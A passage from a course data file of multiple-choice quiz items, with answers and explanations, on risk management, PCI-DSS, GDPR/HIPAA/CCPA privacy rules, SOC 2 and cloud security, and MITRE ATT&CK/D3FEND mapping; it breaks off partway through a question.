        explanation: "The four strategies are Mitigate, Transfer, Avoid, and Accept. 'Ignore' is not a valid risk treatment — even acceptance requires documentation."
      },
      {
        id: "cf-q5-6",
        question: "What is FIPS 199 used for in RMF?",
        options: [
          "Establishing approved symmetric and asymmetric cryptographic algorithms for protecting data at rest.",
          "Categorizing information systems into Low, Moderate, or High impact levels for security objectives.",
          "Defining specific audit procedures and compliance guidelines for external security assessors.",
          "Configuring continuous network monitoring sensors and defining system alert thresholds."
        ],
        correctAnswer: 1,
        explanation: "FIPS 199 is used in RMF Step 2 to categorize information systems by impact level (Low, Moderate, High) for confidentiality, integrity, and availability."
      },
      {
        id: "cf-q5-7",
        question: "What does STRIDE stand for in threat modeling?",
        options: [
          "Security, Testing, Risk assessment, Integration validation, Defensive planning, and Evaluation metrics.",
          "Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, and Elevation of Privilege.",
          "Standards, Threats, Regulations, Implementation patterns, Detection rule tuning, and Enforcement policies.",
          "System security, Threat intelligence, Risk mitigation, Incident containment, Data protection, and Eviction."
        ],
        correctAnswer: 1,
        explanation: "STRIDE categorizes threats: Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, and Elevation of Privilege."
      },
      {
        id: "cf-q5-8",
        question: "What is residual risk?",
        options: [
          "The total initial risk exposure before any security controls or mitigation strategies are implemented.",
          "The risk that remains after security controls and mitigation treatment measures have been applied.",
          "The risk that was completely eliminated by decommissioning the target system or business process.",
          "The risk associated with external factors like market changes, independent of system security."
        ],
        correctAnswer: 1,
        explanation: "Residual risk is the risk that remains after treatment measures have been applied. It must fall within the organization's risk appetite."
      },
      {
        id: "cf-q5-9",
        question: "What should a risk acceptance form include?",
        options: [
          "Only a brief, high-level description of the technical threat and the affected hardware assets.",
          "Risk ID, description, level, business justification, owner, approval date, and scheduled review date.",
          "Just the formal signature of the CISO and a list of recommended security tools to purchase.",
          "A detailed network topology diagram and the most recent vulnerability scan results from the host."
        ],
        correctAnswer: 1,
        explanation: "Risk acceptance forms must document the risk details, justification, compensating controls, risk owner approval, and scheduled review dates."
      },
      {
        id: "cf-q5-10",
        question: "What is the SIG questionnaire used for?",
        options: [
          "Conducting annual employee satisfaction surveys and evaluating internal training effectiveness.",
          "Assessing third-party vendor security posture using a standardized, industry-accepted tool.",
          "Documenting step-by-step incident response procedures for containment and system restoration.",
          "Reviewing secure software development lifecycles and validating source code integrity."
        ],
        correctAnswer: 1,
        explanation: "The SIG (Standardized Information Gathering) questionnaire is a standardized tool for assessing third-party vendor security posture."
      },
      {
        id: "cf-q5-11",
        question: "Which NIST publication contains security controls for RMF?",
        options: [
          "NIST SP 800-37, which outlines the steps of the Risk Management Framework implementation lifecycle.",
          "NIST SP 800-53, which provides a comprehensive catalog of security and privacy controls for systems.",
          "NIST SP 800-61, which provides guidelines for establishing incident response capabilities and playbooks.",
          "NIST SP 800-171, which defines security requirements for protecting controlled unclassified information."
        ],
        correctAnswer: 1,
        explanation: "NIST SP 800-53 Rev. 5 contains over 1,000 security and privacy controls across 20 families used in the RMF."
      },
      {
        id: "cf-q5-12",
        question: "What contract clause is essential for third-party risk management?",
        options: [
          "A non-compete clause preventing the vendor from working with direct business competitors.",
          "A right to audit clause allowing the organization to assess the vendor's security controls.",
          "A marketing rights clause defining how each company can use the other's logo on websites.",
          "A price guarantee clause locking in service rates and licensing costs for the contract duration."
        ],
        correctAnswer: 1,
        explanation: "The right to audit clause allows organizations to assess their vendors' security controls and compliance."
      },
      {
        id: "cf-q5-13",
        question: "In quantitative risk analysis, what is SLE?",
        options: [
          "Security Level Evaluation — a metric determining the maturity score of local endpoint systems.",
          "Single Loss Expectancy — the monetary loss expected from a single occurrence of a specific risk.",
          "System Lifecycle Efficiency — a score measuring database response times and uptime statistics.",
          "Standard Log Entry — a standardized format for representing network connection metadata."
        ],
        correctAnswer: 1,
        explanation: "SLE (Single Loss Expectancy) = Asset Value × Exposure Factor — the expected monetary loss from a single incident."
      },
      {
        id: "cf-q5-14",
        question: "What is the most effective way to handle a risk that outweighs its business benefit?",
        options: [
          "Accept the risk formally, documenting the decision in the corporate risk register for audits.",
          "Transfer the risk to a third party, typically by purchasing a specialized cyber insurance policy.",
          "Avoid the risk entirely by eliminating the associated business activity, system, or software.",
          "Mitigate the risk by implementing technical controls like firewalls, MFA, and access limits."
        ],
        correctAnswer: 2,
        explanation: "Risk avoidance — eliminating the risk source entirely — is appropriate when the risk outweighs the business benefit."
      },
      {
        id: "cf-q5-15",
        question: "How often should critical vendors be reassessed?",
        options: [
          "Only once at the initial contract signing, relying on self-reporting for the remainder of the term.",
          "Every five years to align with standard long-term software lifecycle and procurement reviews.",
          "Annually at a minimum, supplemented by continuous monitoring using security rating platforms.",
          "Never after the initial assessment, unless a public data breach involving the vendor occurs."
        ],
        correctAnswer: 2,
        explanation: "Critical vendors should be reassessed annually, with continuous monitoring via security rating platforms between assessments."
      }
    ]
  },
  {
    quizId: "cf-q6",
    courseId: "cybersecurity-frameworks",
    title: "PCI-DSS Quiz",
    description: "Assess your knowledge of PCI-DSS requirements and compliance processes.",
    passingScore: 75,
    timeLimit: 20,
    questions: [
      {
        id: "cf-q6-1",
        question: "How many requirements does PCI-DSS have?",
        options: [
          "The standard defines 6 high-level goals focusing exclusively on network-level firewalls.",
          "The standard contains 10 operational requirements for securing cloud payment portals.",
          "The standard consists of 12 detailed requirements organized into six logical goal areas.",
          "The standard mandates 15 compliance checks for retail point-of-sale terminal security."
        ],
        correctAnswer: 2,
        explanation: "PCI-DSS contains 12 requirements organized into 6 goals for protecting cardholder data."
      },
      {
        id: "cf-q6-2",
        question: "Which cardholder data element must NEVER be stored after authorization?",
        options: [
          "Primary Account Number (PAN), which can be stored if encrypted with strong algorithms.",
          "Cardholder name, which can be stored in cleartext for standard billing purposes.",
          "Card Verification Value (CVV/CVC), which must never be stored after transaction authorization.",
          "Expiration date, which can be stored to facilitate recurring subscription billing."
        ],
        correctAnswer: 2,
        explanation: "CVV/CVC, full track data, and PIN/PIN block must never be stored after authorization, even if encrypted."
      },
      {
        id: "cf-q6-3",
        question: "What is the minimum TLS version required by PCI-DSS?",
        options: [
          "TLS 1.0, which is supported for legacy compatibility with older browser versions.",
          "TLS 1.1, which is allowed under strict security exceptions and compensating controls.",
          "TLS 1.2, which is the mandatory minimum version for encrypting data in transit.",
          "TLS 1.3, which is recommended but not yet enforced as the minimum baseline standard."
        ],
        correctAnswer: 2,
        explanation: "PCI-DSS requires TLS 1.2 or higher for all cardholder data transmission."
      },
      {
        id: "cf-q6-4",
        question: "What is the CDE?",
        options: [
          "Central Data Engine — the primary database server hosting customer transaction histories.",
          "Cardholder Data Environment — the people, processes, and systems that handle cardholder data.",
          "Compliance Documentation Evidence — the repository containing all audit reports and policies.",
          "Cybersecurity Defense Endpoint — the network security tool monitoring payment gateway hosts."
        ],
        correctAnswer: 1,
        explanation: "The CDE (Cardholder Data Environment) includes all people, processes, and technology that store, process, or transmit cardholder data."
      },
      {
        id: "cf-q6-5",
        question: "Which merchant level requires an annual on-site QSA audit?",
        options: [
          "Level 4 merchants, representing small businesses processing under 20,000 annual transactions.",
          "Level 3 merchants, representing businesses processing between 20,000 and 1 million transactions.",
          "Level 2 merchants, representing mid-sized businesses processing up to 6 million transactions.",
          "Level 1 merchants, representing large enterprises processing over 6 million transactions annually."
        ],
        correctAnswer: 3,
        explanation: "Level 1 merchants (>6M transactions/year) require annual on-site assessment by a Qualified Security Assessor (QSA)."
      },
      {
        id: "cf-q6-6",
        question: "What is the most effective way to reduce PCI scope?",
        options: [
          "Filing for compliance exemptions based on historical security record and company size.",
          "Implementing strict network segmentation and tokenization to isolate payment card data.",
          "Increasing the internal security operations staff to monitor the cardholder data environment.",
          "Downgrading database servers to run legacy software packages that bypass modern requirements."
        ],
        correctAnswer: 1,
        explanation: "Network segmentation isolates the CDE, and tokenization replaces cardholder data with non-sensitive tokens — both dramatically reduce scope."
      },
      {
        id: "cf-q6-7",
        question: "How often must ASV scans be performed?",
        options: [
          "Monthly, to capture rapid infrastructure changes and software updates in the network.",
          "Quarterly, by an Approved Scanning Vendor for all external-facing network segments.",
          "Semi-annually, to coincide with regular internal vulnerability scanning procedures.",
          "Annually, as part of the preparation for the main compliance assessment and audit."
        ],
        correctAnswer: 1,
        explanation: "Approved Scanning Vendor (ASV) external vulnerability scans must be performed quarterly for all compliance levels."
      },
      {
        id: "cf-q6-8",
        question: "What PCI-DSS requirement covers access control?",
        options: [
          "Requirement 3, which focuses on protecting stored cardholder data through encryption.",
          "Requirement 7, which mandates restricting access to system components by business need to know.",
          "Requirement 10, which covers tracking and monitoring all access to network resources.",
          "Requirement 12, which addresses maintaining a comprehensive information security policy."
        ],
        correctAnswer: 1,
        explanation: "Requirement 7: Restrict access to system components and cardholder data by business need to know."
      },
      {
        id: "cf-q6-9",
        question: "What is SAQ A designed for?",
        options: [
          "All merchants processing card transactions regardless of their infrastructure or volume.",
          "Card-not-present merchants that completely outsource all payment processing to PCI-compliant services.",
          "Brick-and-mortar retail stores using physical point-of-sale terminals connected via cellular.",
          "Third-party service providers that store, process, or transmit cardholder data on behalf of clients."
        ],
        correctAnswer: 1,
        explanation: "SAQ A is for card-not-present merchants that fully outsource payment processing — the simplest SAQ with only 22 questions."
      },
      {
        id: "cf-q6-10",
        question: "What new requirement did PCI-DSS v4.0 add for all CDE access?",
        options: [
          "Mandatory annual security awareness training specifically tailored for payment terminal operators.",
          "Multi-factor authentication (MFA) for all access to the Cardholder Data Environment (CDE).",
          "Weekly compliance report generation and submission to the card brands and payment processor.",
          "Stationing physical guards at all entry points to corporate data centers hosting card databases."
        ],
        correctAnswer: 1,
        explanation: "PCI-DSS v4.0 expanded MFA requirements to cover all access to the CDE, not just remote access."
      },
      {
        id: "cf-q6-11",
        question: "What are the potential fines for PCI-DSS non-compliance?",
        options: [
          "A nominal fine ranging from $100 to $500 per incident, assessed by the local merchant bank.",
          "A fixed penalty between $1,000 and $5,000 per year of non-compliance, set by the card brands.",
          "Ongoing fines ranging from $5,000 to $100,000 per month, assessed by the payment brands.",
          "A flat $1 million minimum fine for any compliance failure, regardless of organization size."
        ],
        correctAnswer: 2,
        explanation: "PCI-DSS non-compliance fines range from $5,000 to $100,000 per month until the organization achieves compliance."
      },
      {
        id: "cf-q6-12",
        question: "What does PCI-DSS Requirement 10 cover?",
        options: [
          "Restricting physical access to cardholder data and payment terminal infrastructure.",
          "Tracking and monitoring all access to network resources and cardholder data system components.",
          "Developing and maintaining secure systems, applications, and web-facing payment portals.",
          "Maintaining a comprehensive security policy that addresses information security for all personnel."
        ],
        correctAnswer: 1,
        explanation: "Requirement 10: Log and monitor all access to system components and cardholder data, with audit trails and SIEM."
      },
      {
        id: "cf-q6-13",
        question: "What is tokenization?",
        options: [
          "Generating strong cryptographic keys for symmetric encryption of transaction databases.",
          "Replacing sensitive cardholder data with a non-sensitive equivalent token with no card value.",
          "Isolating payment network segments using firewalls to prevent lateral movement of threats.",
          "Conducting specialized security training for employees handling customer credit card accounts."
        ],
        correctAnswer: 1,
        explanation: "Tokenization replaces cardholder data with a non-sensitive token that has no exploitable value if breached."
      },
      {
        id: "cf-q6-14",
        question: "How long must PCI-DSS audit logs be retained?",
        options: [
          "A minimum of 30 days, to capture immediate security events and active system alerts.",
          "A minimum of 90 days, which must be immediately available for local system query and analysis.",
          "A minimum of 12 months, with at least 3 months immediately available for online analysis.",
          "A minimum of 7 years, to comply with federal tax and financial record retention regulations."
        ],
        correctAnswer: 2,
        explanation: "PCI-DSS requires at least 12 months of audit trail history, with a minimum of 3 months immediately available for analysis."
      },
      {
        id: "cf-q6-15",
        question: "What is the customized approach in PCI-DSS v4.0?",
        options: [
          "A mechanism for small merchants to ignore complex controls by signing a liability waiver form.",
          "An alternative path to meet objectives by designing custom controls validated by risk analysis.",
          "A low-cost compliance certification tier designed for startups with low transaction volume.",
          "A marketing template provided by security vendors to showcase custom firewall configurations."
        ],
        correctAnswer: 1,
        explanation: "The customized approach in v4.0 allows organizations to meet the objective of a requirement using alternative controls justified by risk analysis."
      }
    ]
  },
  {
    quizId: "cf-q7",
    courseId: "cybersecurity-frameworks",
    title: "Data Privacy Regulations Quiz",
    description: "Test your understanding of GDPR, HIPAA, CCPA, and data protection principles.",
    passingScore: 70,
    timeLimit: 20,
    questions: [
      {
        id: "cf-q7-1",
        question: "How many principles does GDPR define?",
        options: [
          "GDPR defines 5 privacy concepts that map to the classic OECD guidelines.",
          "GDPR establishes 7 core principles including lawfulness, minimization, and accountability.",
          "GDPR lists 10 customer rights concerning automated credit decisions.",
          "GDPR mandates 12 operational controls for securing personal database storage systems."
        ],
        correctAnswer: 1,
        explanation: "GDPR defines 7 principles: lawfulness/fairness/transparency, purpose limitation, data minimization, accuracy, storage limitation, integrity/confidentiality, and accountability."
      },
      {
        id: "cf-q7-2",
        question: "Within how many hours must a GDPR breach be reported to authorities?",
        options: [
          "A personal data breach must be reported within 24 hours of initial threat detection.",
          "A personal data breach must be reported within 48 hours of completing internal triage.",
          "A personal data breach must be reported within 72 hours of becoming aware of the event.",
          "A personal data breach must be reported within 7 days of identifying the compromised database."
        ],
        correctAnswer: 2,
        explanation: "GDPR requires breach notification to the supervisory authority within 72 hours of becoming aware of the breach."
      },
      {
        id: "cf-q7-3",
        question: "What is the maximum GDPR fine?",
        options: [
          "A maximum fine of €1 million, assessed for minor documentation and record-keeping failures.",
          "A maximum fine of €10 million, applicable to secondary service processors who violate rules.",
          "A maximum fine of €20 million or 4% of global annual turnover, whichever is higher.",
          "A maximum fine of €100 million, representing a flat baseline penalty for all enterprise violations."
        ],
        correctAnswer: 2,
        explanation: "The maximum GDPR penalty is €20 million or 4% of global annual turnover, whichever is greater."
      },
      {
        id: "cf-q7-4",
        question: "What does PHI stand for in HIPAA?",
        options: [
          "Personal Health Information — representing any high-level medical record metadata.",
          "Protected Health Information — representing individually identifiable health information.",
          "Private Hospital Index — a standardized category system for healthcare facility assets.",
          "Public Health Indicator — a metric tracking general community threat vulnerability levels."
        ],
        correctAnswer: 1,
        explanation: "PHI stands for Protected Health Information — any individually identifiable health information."
      },
      {
        id: "cf-q7-5",
        question: "What three types of safeguards does the HIPAA Security Rule require?",
        options: [
          "Network firewalls, Application scanners, and Cloud infrastructure security baselines.",
          "Administrative policies, Physical access controls, and Technical security safeguards.",
          "Legal review frameworks, Financial budget auditing, and Operational triage workflows.",
          "Preventive rule structures, Detective alert sensors, and Corrective host isolation playbooks."
        ],
        correctAnswer: 1,
        explanation: "The HIPAA Security Rule requires Administrative, Physical, and Technical safeguards to protect ePHI."
      },
      {
        id: "cf-q7-6",
        question: "What revenue threshold triggers CCPA applicability?",
        options: [
          "Annual gross revenues exceeding $10 million, irrespective of data volume or processing scale.",
          "Annual gross revenues exceeding $25 million, establishing CCPA applicability for corporate entities.",
          "Annual gross revenues exceeding $50 million, covering large digital service providers.",
          "Annual gross revenues exceeding $100 million, targeting multinational enterprise organizations."
        ],
        correctAnswer: 1,
        explanation: "CCPA applies to businesses with annual gross revenue over $25 million (among other triggers)."
      },
      {
        id: "cf-q7-7",
        question: "What is the 'Right to be Forgotten'?",
        options: [
          "The legal right of consumers to request name changes on public record databases.",
          "The right to request deletion of personal data under GDPR's right to erasure guidelines.",
          "The technical process of forcing immediate user password resets and logouts across systems.",
          "The legal right of employees to request removal of their photos from corporate social channels."
        ],
        correctAnswer: 1,
        explanation: "The Right to be Forgotten (right to erasure) allows data subjects to request deletion of their personal data under GDPR."
      },
      {
        id: "cf-q7-8",
        question: "What did CPRA add to California privacy law?",
        options: [
          "Mandatory criminal penalties for corporate officers who neglect basic database backup plans.",
          "A 'sensitive personal information' category and the California Privacy Protection Agency.",
          "Broad international applicability forcing foreign servers to register with state registries.",
          "Specific blockchain record-keeping rules and distributed ledger protection standards."
        ],
        correctAnswer: 1,
        explanation: "CPRA added the 'sensitive personal information' category, created the California Privacy Protection Agency, and strengthened existing rights."
      },
      {
        id: "cf-q7-9",
        question: "What is a BAA in HIPAA?",
        options: [
          "Business Audit Agreement — a document detailing annual regulatory audit schedules.",
          "Business Associate Agreement — a contract defining vendor security duties for ePHI.",
          "Breach Assessment Acknowledgment — a report filed after a validated compromise occurs.",
          "Basic Access Authorization — a template assigning user permission levels in applications."
        ],
        correctAnswer: 1,
        explanation: "A BAA (Business Associate Agreement) is required for any vendor handling ePHI, defining their security obligations."
      },
      {
        id: "cf-q7-10",
        question: "When must a DPIA be conducted under GDPR?",
        options: [
          "For all data processing operations, regardless of scale, impact, or type of data handled.",
          "When data processing operations present high risk to the rights and freedoms of individuals.",
          "Only for government and public sector organizations that process census records.",
          "Only after a verified security breach has compromised personal identification data."
        ],
        correctAnswer: 1,
        explanation: "DPIAs are mandatory when processing is 'likely to result in a high risk' to data subjects' rights and freedoms."
      },
      {
        id: "cf-q7-11",
        question: "How many US states had comprehensive privacy laws by 2024?",
        options: [
          "Only California had enacted a comprehensive state-level consumer privacy law.",
          "Approximately 5 states, representing early adopters on the west coast and northeast.",
          "More than 15 states, creating a complex patchwork of regulatory requirements.",
          "All 50 states had implemented unified consumer privacy frameworks."
        ],
        correctAnswer: 2,
        explanation: "By 2024, 15+ US states had enacted comprehensive privacy laws, creating a complex patchwork of requirements."
      },
      {
        id: "cf-q7-12",
        question: "What is 'Privacy by Design'?",
        options: [
          "Designing beautiful and user-friendly privacy settings menus in web applications.",
          "Embedding privacy considerations proactively into system architecture from the start.",
          "A specialized software framework that automates data deletion request workflows.",
          "A mandatory HIPAA policy document that outlines physical storage design templates."
        ],
        correctAnswer: 1,
        explanation: "Privacy by Design embeds privacy into the design and architecture of systems and business practices from the start."
      },
      {
        id: "cf-q7-13",
        question: "What breach size triggers HIPAA notification to media?",
        options: [
          "Any compromise of Protected Health Information (PHI), regardless of scale or scope.",
          "A compromise affecting 100 or more individuals, reported within 60 days of detection.",
          "A compromise affecting 500 or more individuals in a single state or jurisdiction.",
          "A compromise affecting 1,000 or more individuals, requiring immediate national broadcast."
        ],
        correctAnswer: 2,
        explanation: "HIPAA requires media notification when a breach affects 500 or more individuals in a single state or jurisdiction."
      },
      {
        id: "cf-q7-14",
        question: "Which GDPR lawful basis is used for processing a purchase order?",
        options: [
          "Explicit Consent, where the customer checks a box before making a purchase.",
          "Contract, where processing is necessary to perform a contract with the individual.",
          "Legitimate Interests, where the organization balances its interests against user rights.",
          "Vital Interests, where processing is required to protect the physical life of the individual."
        ],
        correctAnswer: 1,
        explanation: "Processing necessary for contract performance — such as processing a purchase order — uses the 'contract' lawful basis."
      },
      {
        id: "cf-q7-15",
        question: "How many countries have data protection laws globally?",
        options: [
          "Approximately 30 developed nations, mostly concentrated within the European Union.",
          "Approximately 70 nations, representing primary global financial and technology hubs.",
          "More than 137 countries, reflecting a strong global trend toward privacy regulation.",
          "All 195 recognized countries have active, comprehensive privacy law frameworks."
        ],
        correctAnswer: 2,
        explanation: "Over 137 countries have enacted data protection laws, reflecting the global trend toward privacy regulation."
      }
    ]
  },
  {
    quizId: "cf-q8",
    courseId: "cybersecurity-frameworks",
    title: "SOC 2 & Cloud Security Quiz",
    description: "Evaluate your knowledge of SOC 2 TSCs and cloud security frameworks.",
    passingScore: 70,
    timeLimit: 20,
    questions: [
      {
        id: "cf-q8-1",
        question: "How many Trust Service Criteria does SOC 2 have?",
        options: [
          "SOC 2 defines 3 criteria: Confidentiality, Integrity, and Access Control policies.",
          "SOC 2 defines 5 criteria: Security, Availability, Processing Integrity, Confidentiality, and Privacy.",
          "SOC 2 defines 7 criteria to align with the standard OSI network security layers.",
          "SOC 2 defines 10 criteria covering all aspects of software development and accounting."
        ],
        correctAnswer: 1,
        explanation: "SOC 2 has 5 Trust Service Criteria: Security, Availability, Processing Integrity, Confidentiality, and Privacy."
      },
      {
        id: "cf-q8-2",
        question: "Which TSC is always required in a SOC 2 report?",
        options: [
          "Availability criteria, verifying system uptime metrics and disaster recovery procedures.",
          "Privacy criteria, validating compliance with state and international data protection laws.",
          "Security (Common Criteria), which forms the mandatory foundation of every SOC 2 report.",
          "Processing Integrity criteria, ensuring databases execute queries accurately without error."
        ],
        correctAnswer: 2,
        explanation: "Security (Common Criteria) is always required — it's the foundation included in every SOC 2 report."
      },
      {
        id: "cf-q8-3",
        question: "What is the minimum observation period for SOC 2 Type II?",
        options: [
          "An observation period of 1 month, focusing on immediate control configurations.",
          "An observation period of 3 months, though a 6-to-12-month period is typical in audits.",
          "An observation period of 6 months, which is required only for financial sector companies.",
          "An observation period of 12 months, representing a strict regulatory minimum for all audits."
        ],
        correctAnswer: 1,
        explanation: "SOC 2 Type II requires a minimum 3-month observation period, though 6-12 months is typical."
      },
      {
        id: "cf-q8-4",
        question: "What is the main difference between Type I and Type II?",
        options: [
          "The audit cost only, with Type II being significantly more expensive due to branding.",
          "Type I evaluates control design at a point in time; Type II tests operating effectiveness over a period.",
          "Type II is significantly easier to pass because it focuses on policy documentation rather than logs.",
          "There is no difference in audit procedures; they are identical reports issued under different codes."
        ],
        correctAnswer: 1,
        explanation: "Type I evaluates control design at a specific date, while Type II tests both design and operating effectiveness over a period of time."
      },
      {
        id: "cf-q8-5",
        question: "Who can issue a SOC 2 report?",
        options: [
          "Any independent cybersecurity consulting firm or accredited scanning service provider.",
          "Licensed CPA (Certified Public Accountant) firms that specialize in audit attestation services.",
          "The internal compliance and IT security team after passing self-assessment criteria.",
          "Government regulatory agencies such as the SEC or FTC following a compliance audit."
        ],
        correctAnswer: 1,
        explanation: "SOC 2 reports can only be issued by licensed CPA (Certified Public Accountant) firms — it's an attestation, not a certification."
      },
      {
        id: "cf-q8-6",
        question: "What does the shared responsibility model define?",
        options: [
          "How users should share credentials and group account permissions safely within teams.",
          "The division of security duties between the cloud provider and the customer.",
          "The scheduling of shared physical workspace and desk usage in co-working offices.",
          "How open-source software libraries share licensing and modification responsibilities."
        ],
        correctAnswer: 1,
        explanation: "The shared responsibility model defines what the cloud provider secures (infrastructure) vs. what the customer secures (data, applications, configurations)."
      },
      {
        id: "cf-q8-7",
        question: "In IaaS, who is responsible for OS patching?",
        options: [
          "The cloud provider, who maintains the underlying physical hypervisor hosts.",
          "The customer, who installs, configures, and maintains the guest operating systems.",
          "No one is responsible, as virtual machines are automatically destroyed and rebuilt.",
          "The government or external compliance auditing firms who scan the infrastructure."
        ],
        correctAnswer: 1,
        explanation: "In IaaS, the customer is responsible for OS patching, application security, and data protection. The provider handles physical and network infrastructure."
      },
      {
        id: "cf-q8-8",
        question: "What is the CSA Cloud Controls Matrix?",
        options: [
          "A compliance certification awarded to cloud providers who pass vulnerability checks.",
          "A cybersecurity control framework with 197 objectives designed for cloud computing.",
          "A network monitoring tool that aggregates log traffic from multi-cloud environments.",
          "An encryption standard defining key exchange protocols for container instances."
        ],
        correctAnswer: 1,
        explanation: "The CCM is a cybersecurity control framework with 197 control objectives across 17 domains designed specifically for cloud computing."
      },
      {
        id: "cf-q8-9",
        question: "What is the CAIQ?",
        options: [
          "Cloud Access Intelligence Query — a standardized database language for logs.",
          "Consensus Assessments Initiative Questionnaire — documenting cloud security posture.",
          "Compliance Automated Inspection Queue — a list of pending audits in the GRC system.",
          "Cloud Audit Internal Qualification — a certification program for cloud security analysts."
        ],
        correctAnswer: 1,
        explanation: "The CAIQ (Consensus Assessments Initiative Questionnaire) is a standardized questionnaire for documenting cloud provider security posture."
      },
      {
        id: "cf-q8-10",
        question: "What AWS service provides centralized security findings?",
        options: [
          "AWS Lambda, which executes serverless code in response to system event triggers.",
          "AWS Security Hub, which aggregates security findings from multiple services and tools.",
          "Amazon S3, which provides object storage buckets for database backups and logs.",
          "AWS CloudFormation, which automates infrastructure deployment using template files."
        ],
        correctAnswer: 1,
        explanation: "AWS Security Hub provides a centralized view of security findings from multiple AWS services and third-party tools."
      },
      {
        id: "cf-q8-11",
        question: "How many Common Criteria (CC) categories are in SOC 2 Security?",
        options: [
          "5 categories focusing on user accounts, encryption, and physical access controls.",
          "7 categories aligning with the classic COBIT internal auditing frameworks.",
          "9 categories organized from the Control Environment through Risk Mitigation.",
          "12 categories covering secure software design, server configuration, and monitoring."
        ],
        correctAnswer: 2,
        explanation: "The Security criteria are organized into 9 CC categories: Control Environment through Risk Mitigation."
      },
      {
        id: "cf-q8-12",
        question: "What is the typical cost range for a SOC 2 Type II audit?",
        options: [
          "Between $5,000 and $10,000 for a comprehensive evaluation and report generation.",
          "Between $30,000 and $100,000+, depending on scope, complexity, and auditor choices.",
          "Between $500,000 and $1 million, representing the standard enterprise audit baseline.",
          "Free, as the AICPA provides self-attestation templates that require no licensing fees."
        ],
        correctAnswer: 1,
        explanation: "SOC 2 Type II audits typically cost between $30K-$100K+, depending on scope and complexity."
      },
      {
        id: "cf-q8-13",
        question: "Which CSA STAR level involves third-party audit?",
        options: [
          "Level 1, which relies on self-assessment and submitting security questionnaires.",
          "Level 2, which requires an independent third-party assessment or attestation audit.",
          "Level 3, which involves continuous automated monitoring of cloud control endpoints.",
          "All levels require third-party audits and formal certification by registered CPAs."
        ],
        correctAnswer: 1,
        explanation: "CSA STAR Level 2 involves independent third-party assessment through CSA STAR Certification or Attestation."
      },
      {
        id: "cf-q8-14",
        question: "What compliance automation tool helps with SOC 2 readiness?",
        options: [
          "Microsoft Word, used to write manual policy documents and checklist templates.",
          "Vanta, which automates evidence collection and continuously checks system controls.",
          "Photoshop, used to generate visual network diagrams and reports for auditors.",
          "Slack, used to message team members about pending compliance tasks and schedules."
        ],
        correctAnswer: 1,
        explanation: "Vanta and similar platforms (Drata, Secureframe) automate evidence collection and continuously monitor controls for SOC 2 readiness."
      },
      {
        id: "cf-q8-15",
        question: "In SaaS, what does the customer remain responsible for?",
        options: [
          "Maintaining physical data center security and server rack access restrictions.",
          "Patching the hypervisor and guest operating systems running the SaaS application.",
          "Data classification, identity management, and user access controls in the console.",
          "Configuring physical network switches and local gateway hardware interfaces."
        ],
        correctAnswer: 2,
        explanation: "Even in SaaS, customers remain responsible for data classification, user access management, and how they use the service."
      }
    ]
  },
  {
    quizId: "cf-q9",
    courseId: "cybersecurity-frameworks",
    title: "MITRE & Cross-Mapping Quiz",
    description: "Test your ability to map controls across frameworks using ATT&CK and D3FEND.",
    passingScore: 75,
    timeLimit: 20,
    questions: [
      {
        id: "cf-q9-1",
        question: "What is the primary purpose of mapping controls to MITRE ATT&CK?",
        options: [
          "To generate marketing brochures showcasing general network capability values.",
          "To identify detection gaps against real adversary techniques in the environment.",
          "To replace existing compliance standards like ISO 27001 and PCI-DSS completely.",
          "To onboard and train new employees on basic corporate firewall policy settings."
        ],
        correctAnswer: 1,
        explanation: "Mapping controls to ATT&CK reveals which adversary techniques your controls can detect, prevent, or mitigate — and where gaps exist."
      },
      {
        id: "cf-q9-2",
        question: "What does D3FEND stand for?",
        options: [
          "Data Defense Framework for Enterprise Network Defense — a local database standard.",
          "Detection, Denial, and Disruption Framework Empowering Network Defense.",
          "Digital Defense for Enterprise Networks and Domains — a federal privacy protocol.",
          "Dynamic Defense Framework for Endpoint Detection — an EDR optimization guide."
        ],
        correctAnswer: 1,
        explanation: "D3FEND stands for Detection, Denial, and Disruption Framework Empowering Network Defense."
      },
      {
        id: "cf-q9-3",
        question: "What are the D3FEND tactics?",
        options: [
          "Identify, Protect, Detect, Respond, and Recover — the core framework elements.",
          "Harden, Detect, Isolate, Deceive, and Evict — representing defensive concepts.",
          "Plan, Do, Check, and Act — the classic continuous improvement lifecycle stages.",
          "Scout, Shield, Strike, Secure, and Monitor — the offensive operational lifecycle."
        ],
        correctAnswer: 1,
        explanation: "D3FEND tactics are: Harden (reduce attack surface), Detect (identify activity), Isolate (contain), Deceive (mislead), Evict (remove)."
      },
      {
        id: "cf-q9-4",
        question: "What tool visualizes ATT&CK coverage as a heatmap?",
        options: [
          "Wireshark, which captures and reconstructs network conversations and traffic flows.",
          "ATT&CK Navigator, which creates visual heatmaps mapping control coverage.",
          "Nmap, which scans ports and identifies active services running on the subnet.",
          "Splunk, which aggregates and indexes log files for search and dashboard metrics."
        ],
        correctAnswer: 1,
        explanation: "The ATT&CK Navigator creates visual heatmaps showing control coverage across all tactics and techniques."
      },
      {
        id: "cf-q9-5",
        question: "What is the main benefit of cross-framework mapping?",
        options: [
          "It makes policy documents longer and more impressive to audit committees.",
          "It allows one well-implemented control to satisfy multiple framework requirements.",
          "It completely eliminates the need for external audits and compliance testing.",
          "It replaces all existing frameworks with a single, simplified cybersecurity checklist."
        ],
        correctAnswer: 1,
        explanation: "Cross-mapping shows that one well-implemented control can satisfy requirements from multiple frameworks simultaneously."
      },
      {
        id: "cf-q9-6",
        question: "Which MFA control maps to ATT&CK T1078 (Valid Accounts)?",
        options: [
          "Strict network segmentation isolating database servers in distinct VLANS.",
          "Multi-factor authentication (MFA) protecting administrative access endpoints.",
          "Implementing AES-256 data encryption for all backup records stored on-premises.",
          "Continuous log monitoring and SIEM alert generation for failed ping requests."
        ],
        correctAnswer: 1,
        explanation: "MFA directly prevents T1078 (Valid Accounts) by requiring additional authentication factors beyond stolen credentials."
      },
      {
        id: "cf-q9-7",
        question: "What score indicates no ATT&CK technique coverage?",
        options: [
          "Score 4, representing high-fidelity detection and automated blocking capabilities.",
          "Score 2, indicating standard log coverage without active alert configurations.",
          "Score 1, representing basic alert generation with significant false positive rates.",
          "Score 0, indicating a complete absence of detection or prevention controls."
        ],
        correctAnswer: 3,
        explanation: "Score 0 (red) indicates no coverage — no detection or prevention controls exist for that technique."
      },
      {
        id: "cf-q9-8",
        question: "What is a unified control catalog?",
        options: [
          "A list of all security software packages and hardware assets owned by the firm.",
          "A single document that maps each control to multiple framework requirements.",
          "An employee directory listing security team members and their access credentials.",
          "A raw vulnerability scan report detailing missing software patches across hosts."
        ],
